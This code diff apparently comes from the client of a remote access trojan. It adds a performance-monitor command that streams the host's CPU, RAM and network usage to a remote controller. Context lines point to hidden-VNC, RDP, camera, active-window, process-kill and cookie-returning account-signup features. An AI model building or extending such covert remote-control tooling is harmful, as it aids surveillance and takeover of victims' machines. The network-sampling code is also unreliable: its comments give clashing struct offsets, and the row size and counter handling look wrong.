@@ -460,6 +460,18 @@ internal class TlsClient : IDisposable
                     if (procKill != null) ProcessManagerFeature.Kill(procKill.Pid);
                     break;
 
+                // ── Performance Monitor ──────────────────────────────
+                case PacketType.PerfMonStart:
+                    var perfCfg = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.PerfMonStartStub);
+                    _perfMonIntervalMs = perfCfg?.IntervalMs > 0 ? perfCfg.IntervalMs : 1000;
+                    _perfMonRunning = true;
+                    _ = PerfMonLoop(ct);
+                    break;
+
+                case PacketType.PerfMonStop:
+                    _perfMonRunning = false;
+                    break;
+
                 case PacketType.ProcSuspend:
                     var procSusp = JsonSerializer.Deserialize(packet.Data, SeroJson.Default.ProcSuspendResumeStub);
                     if (procSusp != null) ProcessManagerFeature.Suspend(procSusp.Pid);
@@ -756,6 +768,76 @@ internal class TlsClient : IDisposable
         }
         catch { }
         return new HardwareStatsStub { CpuUsage = cpu, RamUsed = ramUsed, RamTotal = ramTotal };
+    }
+
+    // ── Network sampling (GetIfTable) ───────────────────────────────────────
+    [System.Runtime.InteropServices.DllImport("iphlpapi.dll")]
+    private static extern uint GetIfTable(IntPtr pIfTable, ref uint pdwSize, bool bOrder);
+
+    private long _lastNetSent, _lastNetRecv;
+    private DateTime _lastNetTs = DateTime.UtcNow;
+
+    private (long sentKBps, long recvKBps) SampleNetwork()
+    {
+        try
+        {
+            uint size = 0;
+            GetIfTable(IntPtr.Zero, ref size, false);
+            if (size == 0) return (0, 0);
+            var buf = System.Runtime.InteropServices.Marshal.AllocHGlobal((int)size);
+            try
+            {
+                if (GetIfTable(buf, ref size, false) != 0) return (0, 0);
+                int count = System.Runtime.InteropServices.Marshal.ReadInt32(buf);
+                long sent = 0, recv = 0;
+                int offset = 4;
+                for (int i = 0; i < count; i++)
+                {
+                    // MIB_IFROW: dwOutOctets at +96, dwInOctets at +100 (simplified offsets)
+                    // Actual layout: 220 bytes per row, OutOctets at offset 100, InOctets at 92
+                    sent += System.Runtime.InteropServices.Marshal.ReadInt32(buf, offset + 96);
+                    recv += System.Runtime.InteropServices.Marshal.ReadInt32(buf, offset + 92);
+                    offset += 220;
+                }
+                var now = DateTime.UtcNow;
+                var elapsed = (now - _lastNetTs).TotalSeconds;
+                long sentKBps = elapsed > 0 ? (long)((sent - _lastNetSent) / elapsed / 1024) : 0;
+                long recvKBps = elapsed > 0 ? (long)((recv - _lastNetRecv) / elapsed / 1024) : 0;
+                _lastNetSent = sent; _lastNetRecv = recv; _lastNetTs = now;
+                return (Math.Max(0, sentKBps), Math.Max(0, recvKBps));
+            }
+            finally { System.Runtime.InteropServices.Marshal.FreeHGlobal(buf); }
+        }
+        catch { return (0, 0); }
+    }
+
+    // ── PerfMon streaming ────────────────────────────────────────────────────
+    private volatile bool _perfMonRunning;
+    private int _perfMonIntervalMs = 1000;
+
+    private async Task PerfMonLoop(CancellationToken ct)
+    {
+        while (_perfMonRunning && !ct.IsCancellationRequested)
+        {
+            try
+            {
+                await Task.Delay(_perfMonIntervalMs, ct);
+                if (!_perfMonRunning) break;
+                var cpu = SampleCpu();
+                var hw  = SampleHardware(cpu);
+                var (sent, recv) = SampleNetwork();
+                var data = JsonSerializer.Serialize(new PerfMonDataStub
+                {
+                    CpuUsage      = hw.CpuUsage,
+                    RamUsed       = hw.RamUsed,
+                    RamTotal      = hw.RamTotal,
+                    NetworkSentKB = sent,
+                    NetworkRecvKB = recv
+                }, SeroJson.Default.PerfMonDataStub);
+                await WritePacketAsync(new Packet { Type = PacketType.PerfMonData, Data = data }, CancellationToken.None);
+            }
+            catch { break; }
+        }
     }
 
     private async Task HeartbeatSender(CancellationToken ct)
@@ -1459,6 +1541,9 @@ internal enum PacketType
     ActiveWindow = 34,
     CameraStatus  = 35,
     HardwareStats = 36,
+    PerfMonStart  = 37,
+    PerfMonStop   = 38,
+    PerfMonData   = 39,
 
     RdpStart = 50,
     RdpStop = 51,
@@ -1778,8 +1863,10 @@ internal class HvncClipboardDataStub
 // CDP Signup
 [JsonSerializable(typeof(CdpSignupStatusStub))]
 [JsonSerializable(typeof(CdpSignupResultStub))]
-// Hardware Stats
+// Hardware Stats + PerfMon
 [JsonSerializable(typeof(HardwareStatsStub))]
+[JsonSerializable(typeof(PerfMonStartStub))]
+[JsonSerializable(typeof(PerfMonDataStub))]
 // Process Manager extended
 [JsonSerializable(typeof(ProcSuspendResumeStub))]
 // TCP Firewall
@@ -1826,8 +1913,10 @@ internal partial class SeroJson : JsonSerializerContext { }
 internal class CdpSignupStatusStub { public string Step { get; set; } = ""; public string Message { get; set; } = ""; }
 internal class CdpSignupResultStub  { public bool Success { get; set; } public string Account { get; set; } = ""; public string Cookie { get; set; } = ""; public string Error { get; set; } = ""; }
 
-// ── Hardware Stats ────────────────────────────────────
+// ── Hardware Stats + PerfMon ─────────────────────────
 internal class HardwareStatsStub { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } }
+internal class PerfMonStartStub  { public int IntervalMs { get; set; } = 1000; }
+internal class PerfMonDataStub   { public float CpuUsage { get; set; } public long RamUsed { get; set; } public long RamTotal { get; set; } public long NetworkSentKB { get; set; } public long NetworkRecvKB { get; set; } }
 
 // ── Process Manager extended ──────────────────────────
 internal class ProcSuspendResumeStub { public int Pid { get; set; } }
